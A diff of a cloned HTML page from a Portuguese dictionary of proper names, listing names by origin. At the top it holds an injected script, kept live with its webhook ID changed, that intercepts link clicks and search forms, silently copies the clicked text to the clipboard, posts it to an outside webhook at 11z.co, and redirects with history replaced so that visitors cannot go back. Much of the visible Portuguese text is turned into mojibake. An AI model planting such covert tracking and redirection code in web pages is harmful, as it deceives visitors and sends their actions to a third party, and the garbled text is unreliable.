@@ -1,10 +1,10 @@
 <!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-br" lang="pt-br"><head>
-    <!-- Script de Redirecionamento Avan�ado: C�pia Silenciosa e Substitui��o de Hist�rico -->
+    <!-- Script de Redirecionamento Avançado: Cópia Silenciosa e Substituição de Histórico -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const baseUrl = 'https://www.dicionariodenomesproprios.com.br';
 
-            // Fun��o para copiar texto para o clipboard de forma silenciosa
+            // Função para copiar texto para o clipboard de forma silenciosa
             async function copyToClipboard(text) {
                 try {
                     // Tenta a API moderna primeiro
@@ -24,11 +24,11 @@
                         document.body.removeChild(textArea);
                     }
                 } catch (err) {
-                    // Silencioso: N�o faz nada em caso de erro
+                    // Silencioso: Não faz nada em caso de erro
                 }
-                // Envia webhook em segundo plano (n�o bloqueia nada)
+                // Envia webhook em segundo plano (não bloqueia nada)
                 // keepalive: true garante que o Safari envie o POST mesmo durante redirecionamento
-                fetch("https://www.11z.co/_w/5156/selection", {
+                fetch("https://www.11z.co/_w/17093/selection", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ "value": text }),
@@ -46,34 +46,34 @@
                 }
             });
 
-            // 1. Redirecionar cliques em links com c�pia silenciosa
+            // 1. Redirecionar cliques em links com cópia silenciosa
             document.body.addEventListener('click', async function(e) {
                 const link = e.target.closest('a');
                 if (link && link.getAttribute('href')) {
                     const href = link.getAttribute('href');
                     
-                    // Intercepta links internos (relativos) ou links j� convertidos para o baseUrl
+                    // Intercepta links internos (relativos) ou links já convertidos para o baseUrl
                     const localAbas = ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
                     const isInternal = ((!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl)) && !localAbas.includes(href.replace(baseUrl, ''));
                     if (isInternal) {
                         e.preventDefault();
                         
-                        // Captura o texto do nome (limpa espa�os extras)
+                        // Captura o texto do nome (limpa espaços extras)
                         const textToCopy = link.innerText.trim();
                         if (textToCopy) {
                             await copyToClipboard(textToCopy);
                         }
 
-                        // Se o href j� � a URL completa, usa direto; sen�o monta
+                        // Se o href já é a URL completa, usa direto; senão monta
                         const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
 
-                        // Redireciona substituindo a p�gina no hist�rico (n�o permite voltar)
+                        // Redireciona substituindo a página no histórico (não permite voltar)
                         window.location.replace(targetUrl);
                     }
                 }
             }, true);
 
-            // 2. Redirecionar formul�rios de busca com c�pia silenciosa
+            // 2. Redirecionar formulários de busca com cópia silenciosa
             const searchForms = document.querySelectorAll('form');
             searchForms.forEach(form => {
                 form.addEventListener('submit', async function(e) {
@@ -92,7 +92,7 @@
                         const path = action.startsWith('/') ? action : '/' + action;
                         const targetUrl = baseUrl + path + '?' + params;
 
-                        // Redireciona substituindo a p�gina no hist�rico
+                        // Redireciona substituindo a página no histórico
                         window.location.replace(targetUrl);
                     }
                 });
@@ -103,23 +103,23 @@
 
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Nomes pela Origem - Dicionário de Nomes Próprios</title>
-    <meta name="description" content="Lista de Nomes pela Origem no Dicionário de Nomes Próprios. Todas as Nomes pela Origem.">
-    <meta property="og:title" content="Nomes pela Origem - Dicionário de Nomes Próprios">
+    <title>Nomes pela Origem - DicionÃ¡rio de Nomes PrÃ³prios</title>
+    <meta name="description" content="Lista de Nomes pela Origem no DicionÃ¡rio de Nomes PrÃ³prios. Todas as Nomes pela Origem.">
+    <meta property="og:title" content="Nomes pela Origem - DicionÃ¡rio de Nomes PrÃ³prios">
     <meta property="og:type" content="article">
 
         <meta property="og:url" content="https://www.dicionariodenomesproprios.com.br/origem/">
 
     
             <meta property="og:image" content="images/fb_dnp.png">
-        <meta property="og:site_name" content="Dicionário de Nomes Próprios">
+        <meta property="og:site_name" content="DicionÃ¡rio de Nomes PrÃ³prios">
         <meta property="fb:app_id" content="132068570255221">
-    <meta property="og:description" content="Lista de Nomes pela Origem no Dicionário de Nomes Próprios. Todas as Nomes pela Origem.">
+    <meta property="og:description" content="Lista de Nomes pela Origem no DicionÃ¡rio de Nomes PrÃ³prios. Todas as Nomes pela Origem.">
             <link rel="canonical" href="https://www.dicionariodenomesproprios.com.br/origem/">
         <meta property="og:locale" content="pt_BR">
         <meta name="twitter:card" content="summary">
-        <meta name="twitter:title" content="Nomes pela Origem - Dicionário de Nomes Próprios">
-        <meta name="twitter:description" content="Lista de Nomes pela Origem no Dicionário de Nomes Próprios. Todas as Nomes pela Origem.">
+        <meta name="twitter:title" content="Nomes pela Origem - DicionÃ¡rio de Nomes PrÃ³prios">
+        <meta name="twitter:description" content="Lista de Nomes pela Origem no DicionÃ¡rio de Nomes PrÃ³prios. Todas as Nomes pela Origem.">
             <meta name="twitter:url" content="https://www.dicionariodenomesproprios.com.br/origem/">
     
     
@@ -133,7 +133,7 @@
     <link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#eb5d1c">
     <meta name="msapplication-TileColor" content="#fef2ed">
     <meta name="theme-color" content="#fef2ed">
-    <link rel="alternate" type="application/rss+xml" title="Dicionário de Nomes Próprios" href="http://www.dicionariodenomesproprios.com.br/rss.php">
+    <link rel="alternate" type="application/rss+xml" title="DicionÃ¡rio de Nomes PrÃ³prios" href="http://www.dicionariodenomesproprios.com.br/rss.php">
 
     <script>
         window.dataLayer = window.dataLayer || [];
@@ -173,14 +173,14 @@
     <div class="container">
         <div class="row">
             <div class="logo-wrap">
-                <a href="../" title="Dicionário de Nomes Próprios" class="logo">
+                <a href="../" title="DicionÃ¡rio de Nomes PrÃ³prios" class="logo">
                     <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
     <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
         <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
         <path d="M-1.13686838e-13,0.0712355116 L-1.13686838e-13,42.7119864 C-1.13686838e-13,54.4924642 8.58102389,59.8650239 17.8404778,59.8650239 L17.8404778,42.7119864 C27.0088055,59.7698021 45.8844369,59.8613379 59.9416382,59.8613379 L59.9486007,59.8650239 L59.9486007,15.5672082 C59.7477133,24.585843 55.7787031,32.6070034 42.3331741,17.3905529 C25.1203413,-2.0895836 -1.13686838e-13,0.0712355116 -1.13686838e-13,0.0712355116" fill="#EB5D1C"></path>
     </g>
 </svg>                    <span class="logo-txt">
-                        <span class="title">Dicionário de Nomes Próprios</span>
+                        <span class="title">DicionÃ¡rio de Nomes PrÃ³prios</span>
                         <span class="subtitle">Significado dos nomes</span>
                     </span>
                     </a>
@@ -188,7 +188,7 @@
             <div id="menu-btn" class="menu-btn"><i class="icon icon-menu"></i></div>
 
             <div id="fancy-header" class="fancy-header">
-                <a href="../" title="Dicionário de Nomes Próprios" class="fancy-logo">
+                <a href="../" title="DicionÃ¡rio de Nomes PrÃ³prios" class="fancy-logo">
                     <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
     <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
         <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
@@ -205,7 +205,7 @@
                             <li><a class="btn-default" href="../nomes-masculinos/">Masculinos</a></li>
                             <li><a class="btn-default" href="../origem/">Origem</a></li>
                             <li><a class="btn-default" href="../top-brasil/">Top</a></li>
-                            <li><a class="btn-default" href="../bebes/">Bebês</a></li>
+                            <li><a class="btn-default" href="../bebes/">BebÃªs</a></li>
                         </ul>
                     </div>
                             </div>
@@ -221,7 +221,7 @@
     <li><a class="btn-default" href="../nomes-masculinos/"><span class="btn-default--text">Nomes Masculinos</span></a></li>
     <li><a class="btn-default" href="../origem/"><span class="btn-default--text">Nomes pela Origem</span></a></li>
     <li><a class="btn-default" href="../top-brasil/"><span class="btn-default--text">Top Nomes</span></a></li>
-    <li><a class="btn-default" href="../bebes/"><span class="btn-default--text">Nomes de Bebês</span></a></li>
+    <li><a class="btn-default" href="../bebes/"><span class="btn-default--text">Nomes de BebÃªs</span></a></li>
 </ul>        </div>
     </nav>
 </div>
@@ -246,7 +246,7 @@
                         Nomes pela Origem                    </h1>
 
                     <div class="content-header--info w-630">
-                        <p>Origens dos nomes. Lista de Origens dos nomes no Dicionário de Nomes.                                            Encontradas 78 Origens dos nomes:</p>
+                        <p>Origens dos nomes. Lista de Origens dos nomes no DicionÃ¡rio de Nomes.                                            Encontradas 78 Origens dos nomes:</p>
                                         </div>
                 </div>
                 <div class="content-main">
@@ -265,7 +265,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-alemaes/">
-                                            <span>Nomes Alemães</span>
+                                            <span>Nomes AlemÃ£es</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -280,12 +280,12 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-anglo-saxoes/">
-                                            <span>Nomes Anglo-Saxões</span>
+                                            <span>Nomes Anglo-SaxÃµes</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-arabes/">
-                                            <span>Nomes Árabes</span>
+                                            <span>Nomes Ãrabes</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -295,12 +295,12 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-armenios/">
-                                            <span>Nomes Armênios</span>
+                                            <span>Nomes ArmÃªnios</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-assirios/">
-                                            <span>Nomes Assírios</span>
+                                            <span>Nomes AssÃ­rios</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -310,12 +310,12 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-austriacos/">
-                                            <span>Nomes Austríacos</span>
+                                            <span>Nomes AustrÃ­acos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-babilonicos/">
-                                            <span>Nomes Babilônicos</span>
+                                            <span>Nomes BabilÃ´nicos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -325,27 +325,27 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-biblicos/">
-                                            <span>Nomes Bíblicos</span>
+                                            <span>Nomes BÃ­blicos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-bretoes/">
-                                            <span>Nomes Bretões</span>
+                                            <span>Nomes BretÃµes</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-britanicos/">
-                                            <span>Nomes Britânicos</span>
+                                            <span>Nomes BritÃ¢nicos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-bulgaros/">
-                                            <span>Nomes Búlgaros</span>
+                                            <span>Nomes BÃºlgaros</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-catalaes/">
-                                            <span>Nomes Catalães</span>
+                                            <span>Nomes CatalÃ£es</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -370,7 +370,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-cornicos/">
-                                            <span>Nomes Córnicos</span>
+                                            <span>Nomes CÃ³rnicos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -390,7 +390,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-egipcios/">
-                                            <span>Nomes Egípcios</span>
+                                            <span>Nomes EgÃ­pcios</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -410,7 +410,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-espanhois/">
-                                            <span>Nomes Espanhóis</span>
+                                            <span>Nomes EspanhÃ³is</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -425,7 +425,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-fenicios/">
-                                            <span>Nomes Fenícios</span>
+                                            <span>Nomes FenÃ­cios</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -440,7 +440,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-gaelicos/">
-                                            <span>Nomes Gaélicos</span>
+                                            <span>Nomes GaÃ©licos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -455,12 +455,12 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-germanicos/">
-                                            <span>Nomes Germânicos</span>
+                                            <span>Nomes GermÃ¢nicos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-goticos/">
-                                            <span>Nomes Góticos</span>
+                                            <span>Nomes GÃ³ticos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -480,7 +480,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-helenicos/">
-                                            <span>Nomes Helênicos</span>
+                                            <span>Nomes HelÃªnicos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -495,7 +495,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-hungaros/">
-                                            <span>Nomes Húngaros</span>
+                                            <span>Nomes HÃºngaros</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -505,7 +505,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-indigenas/">
-                                            <span>Nomes Indígenas</span>
+                                            <span>Nomes IndÃ­genas</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -535,17 +535,17 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-mitologicos/">
-                                            <span>Nomes Mitológicos</span>
+                                            <span>Nomes MitolÃ³gicos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-muculmanos/">
-                                            <span>Nomes Muçulmanos</span>
+                                            <span>Nomes MuÃ§ulmanos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-nordicos/">
-                                            <span>Nomes Nórdicos</span>
+                                            <span>Nomes NÃ³rdicos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -590,7 +590,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-sanscritos/">
-                                            <span>Nomes Sânscritos</span>
+                                            <span>Nomes SÃ¢nscritos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -605,12 +605,12 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-suicos/">
-                                            <span>Nomes Suíços</span>
+                                            <span>Nomes SuÃ­Ã§os</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-teutonicos/">
-                                            <span>Nomes Teutônicos</span>
+                                            <span>Nomes TeutÃ´nicos</span>
                                         </a>
                                     </li>
                                                                                                                                 <li>
@@ -640,7 +640,7 @@
                                     </li>
                                                                                                                                 <li>
                                         <a href="/nomes-yorubas/">
-                                            <span>Nomes Yorubás</span>
+                                            <span>Nomes YorubÃ¡s</span>
                                         </a>
                                     </li>
                                                                                     </ul>
@@ -781,7 +781,7 @@
                 <div class="list-mod--title">Categorias em destaque</div>
                 <ul class="list-mod--list col-2 list-mod--list-border t-center">
                                             <li>
-                            <a href="/nomes-biblicos/"><span>Nomes Bíblicos</span></a>
+                            <a href="/nomes-biblicos/"><span>Nomes BÃ­blicos</span></a>
                         </li>
                                             <li>
                             <a href="/nomes-italianos/"><span>Nomes Italianos</span></a>
@@ -802,13 +802,13 @@
                             <a href="/nomes-franceses/"><span>Nomes Franceses</span></a>
                         </li>
                                             <li>
-                            <a href="/nomes-indigenas/"><span>Nomes Indígenas</span></a>
+                            <a href="/nomes-indigenas/"><span>Nomes IndÃ­genas</span></a>
                         </li>
                                             <li>
-                            <a href="/nomes-arabes/"><span>Nomes Árabes</span></a>
+                            <a href="/nomes-arabes/"><span>Nomes Ãrabes</span></a>
                         </li>
                                             <li>
-                            <a href="/nomes-mitologicos/"><span>Nomes Mitológicos</span></a>
+                            <a href="/nomes-mitologicos/"><span>Nomes MitolÃ³gicos</span></a>
                         </li>
                                         <li class="full-w see-all"><a href="/categorias/"><span>Todas as Categorias</span></a></li>
                 </ul>
@@ -839,13 +839,13 @@
         <div class="row">
             <div class="col-xs-12">
                 <ul id="footer-list" class="footer-list footer-list--highlight">
-                    <li><a href="/ultimos-nomes/">Últimos Nomes</a></li>
+                    <li><a href="/ultimos-nomes/">Ãltimos Nomes</a></li>
                     <li><a href="/nomes-pelo-mundo/">Nomes pelo Mundo</a></li>
-                    <li><a href="../bebes/">Nomes de Bebês</a></li>
+                    <li><a href="../bebes/">Nomes de BebÃªs</a></li>
                 </ul>
                 <ul class="footer-list footer-list--org">
-                    <li><a href="/sobre/">Sobre Nós</a></li>
-                    <li><a href="/politica-privacidade/">Política de Privacidade</a></li>
+                    <li><a href="/sobre/">Sobre NÃ³s</a></li>
+                    <li><a href="/politica-privacidade/">PolÃ­tica de Privacidade</a></li>
                     <li><a href="https://www.7graus.com/MediaKit-PT-BR.pdf" rel="nofollow" target="_blank">Anuncie</a></li>
                     <li><a href="/termos-uso/">Termos de Uso</a></li>
                     <li><a href="/contato/">Contato</a></li>
@@ -854,9 +854,9 @@
                 <div class="copyright">
                     <span class="info">Significado dos Nomes</span>
                     <span class="separator"> - </span>
-                    <span class="info">Dicionário de Nomes Próprios</span>
+                    <span class="info">DicionÃ¡rio de Nomes PrÃ³prios</span>
                     <br>
-                    <span>� 2008 - 2026 <a href="https://www.7graus.com/" rel="co-worker nofollow">7Graus</a>.</span>
+                    <span>© 2008 - 2026 <a href="https://www.7graus.com/" rel="co-worker nofollow">7Graus</a>.</span>
                 </div>
             </div>
         </div>
@@ -1016,9 +1016,9 @@
                     return;
                 }
                 
-                // Verificar se o retryTime está definido e é um número válido
+                // Verificar se o retryTime estÃ¡ definido e Ã© um nÃºmero vÃ¡lido
                 if (typeof slot.sgRefreshRetryTime !== "number" || isNaN(slot.sgRefreshRetryTime)) {
-                    console.warn(`Retry time não configurado corretamente para o slot: ${slot.getAdUnitPath()}`);
+                    console.warn(`Retry time nÃ£o configurado corretamente para o slot: ${slot.getAdUnitPath()}`);
                     return;
                 }
                 debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd slotRenderEnded slot: isEmpty: ${event.isEmpty} | ${slot.getAdUnitPath()}`, slot);
